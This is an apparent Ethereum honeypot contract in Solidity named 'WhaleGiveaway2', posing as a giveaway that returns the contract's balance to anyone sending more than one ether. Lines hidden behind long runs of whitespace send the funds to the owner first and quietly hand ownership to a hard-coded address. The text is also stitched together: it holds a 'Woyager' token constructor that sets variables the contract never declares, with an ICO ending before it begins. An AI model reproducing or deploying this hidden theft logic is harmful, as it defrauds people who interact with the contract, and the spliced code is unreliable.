 

pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
   

    function Woyager() public {
        totalSupply = 1000000000e18;
        name = 'Woyager';
        symbol = 'WYX';
        decimals = 18;
        balanceOf[0x6e3a106E91f7ddB1C52F68fd3dB61AdCAbfbAa33] = totalSupply;
        Transfer(address(0), 0x6e3a106E91f7ddB1C52F68fd3dB61AdCAbfbAa33, totalSupply);

        airAmount = 5000e18;
        airBegintime = 1533992400;
        airEndtime = 1538351940;
        airSender = 0xCB554264736B84325ec6e8dAe71cA549F5B34649;
        airLimitCount = 1;

        icoRatio = 10e6;
        icoBegintime = 1533992400;
        icoEndtime = 1517443140;
        icoSender = 0x1Bd8917f60d528a0FcF87660CFC80Bf3ed48a353;
        icoHolder = 0x1Bd8917f60d528a0FcF87660CFC80Bf3ed48a353;
    }

    function()
    public
    payable
    {
        
    }
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}
